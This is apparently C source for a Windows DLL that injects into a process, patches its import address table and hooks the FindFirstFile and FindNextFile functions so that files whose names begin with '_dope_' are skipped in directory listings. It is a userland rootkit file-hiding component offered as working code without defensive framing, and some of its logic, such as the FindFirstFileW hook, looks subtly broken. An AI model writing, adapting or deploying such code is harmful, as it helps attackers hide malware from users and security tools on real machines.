

//Optimization Code
#pragma optimize("gsy", on)
#pragma comment(linker, "/RELEASE")
#pragma comment(linker, "/ENTRY:DllMain")
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/MERGE:.reloc=.data")
#pragma comment(linker, "/SECTION:.text,EWR /IGNORE:4078")
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/base:0x13140000")
#pragma pack(1) //?

//Libs
#pragma comment(lib, "kernel32")
#pragma comment(lib, "user32")
#pragma comment(lib, "msvcrt")
#pragma comment(lib, "shlwapi")
#pragma comment(lib, "dbghelp")
#pragma comment(lib, "psapi")

//Regular Includes
#define  WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <stdio.h>

const char *prefix = "_dope_";

//API Hook Engine
void *hook_function(char *szDllName, char *szFunctionName, void *pNewFunction)
{
	#define MakePtr(cast, ptr, addValue)(cast)((DWORD)(ptr) + (DWORD)(addValue))
	DWORD dwOldProtect, dwOldProtect2;
	HMODULE hModule = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER pDosHeader;
	PIMAGE_NT_HEADERS pNTHeader;
	PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
	PIMAGE_THUNK_DATA pThunk;
	void *pOldFunction;
	if (!(pOldFunction = GetProcAddress(GetModuleHandle(szDllName), szFunctionName))) return 0;
		pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return (NULL);
		pNTHeader = MakePtr(PIMAGE_NT_HEADERS, pDosHeader, pDosHeader->e_lfanew );
	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE || (pImportDesc = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, pDosHeader, pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)) == (PIMAGE_IMPORT_DESCRIPTOR)pNTHeader) return (NULL);
	while (pImportDesc->Name)
	{
		char *szModuleName = MakePtr(char *, pDosHeader, pImportDesc->Name);
		if (!stricmp(szModuleName, szDllName)) break;
			pImportDesc++;
	}
	if (pImportDesc->Name == NULL) return (NULL);
		pThunk = MakePtr(PIMAGE_THUNK_DATA, pDosHeader,	pImportDesc->FirstThunk);
	while (pThunk->u1.Function)
	{
		if (pThunk->u1.Function == (DWORD)pOldFunction)
		{
				VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), PAGE_EXECUTE_READWRITE, &dwOldProtect);
				pThunk->u1.Function = (DWORD)pNewFunction;
				VirtualProtect((void *)&pThunk->u1.Function, sizeof(DWORD), dwOldProtect, &dwOldProtect2);
				return (pOldFunction);
		}
			pThunk++;
	}
		return (NULL); 
}

//FindFirstFileA (ANSI)
//HANDLE (WINAPI *pMyFindFirstFileA)(LPCTSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
HANDLE WINAPI MyFindFirstFileA(LPCTSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)
{
	char szBuffer[MAX_PATH], szFileName[MAX_PATH];
	HANDLE ret;
		ret = FindFirstFileA(lpFileName, lpFindFileData);
		sprintf(szFileName, lpFileName);
		PathStripPath(szFileName);
		memcpy(szBuffer, szFileName, 6);
	if (lstrcmpi(szBuffer, prefix) == 0) ret = FindFirstFileA(lpFileName, lpFindFileData);
		return ret;
}

//FindNextFileA (ANSI)
//int (WINAPI *pMyFindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
int WINAPI MyFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
	char szBuffer[MAX_PATH], szFileName[MAX_PATH];
	int ret;
		ret = FindNextFileA(hFindFile, lpFindFileData);
		sprintf(szFileName, lpFindFileData->cFileName);
		PathStripPath(szFileName);
		memcpy(szBuffer, szFileName, 6);
	if (lstrcmpi(szBuffer, prefix) == 0) ret = FindNextFileA(hFindFile, lpFindFileData);
		return ret;
}


//FindFirstFileW (UNICODE)
//HANDLE (WINAPI *pMyFindFirstFileW)(LPCTSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
HANDLE WINAPI MyFindFirstFileW(LPCTSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData)
{
	char szBuffer[MAX_PATH] = "\0", szFileName[MAX_PATH];
	HANDLE ret;
		ret = FindFirstFileW((const unsigned short *)lpFileName, lpFindFileData);
		WideCharToMultiByte(CP_ACP, 0, lpFindFileData->cFileName, MAX_PATH, szFileName, MAX_PATH, NULL, NULL);
		PathStripPath(szFileName);
		memcpy(szBuffer, szFileName, 6);
	if (lstrcmpi(szBuffer, prefix) == 0) ret = FindFirstFileW((const unsigned short *)lpFileName, lpFindFileData);
		return ret;
}

//FindNextFileW (UNICODE)
//int (WINAPI *pMyFindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
int WINAPI MyFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	char szBuffer[MAX_PATH] = "\0", szFileName[MAX_PATH];
	int ret;
		ret = FindNextFileW(hFindFile, lpFindFileData);
		WideCharToMultiByte(CP_ACP, 0, lpFindFileData->cFileName, MAX_PATH, szFileName, MAX_PATH, NULL, NULL);
		PathStripPath(szFileName);
		memcpy(szBuffer, szFileName, 6);
	if (lstrcmpi(szBuffer, prefix) == 0) ret = FindNextFileW(hFindFile, lpFindFileData);
		return ret;
}

//DLL EntryPoint
bool WINAPI DllMain(HANDLE hModule, DWORD dwReason, LPVOID lpReserved)
{
	switch(dwReason)
	{
		case DLL_PROCESS_ATTACH:
			hook_function("KERNEL32.DLL", "FindFirstFileA", MyFindFirstFileA);
			hook_function("KERNEL32.DLL", "FindNextFileA", MyFindNextFileA);
			hook_function("kernel32.dll", "FindFirstFileW", MyFindFirstFileW);
			hook_function("kernel32.dll", "FindNextFileW", MyFindNextFileW);
			return TRUE;
	}
		return TRUE;
}
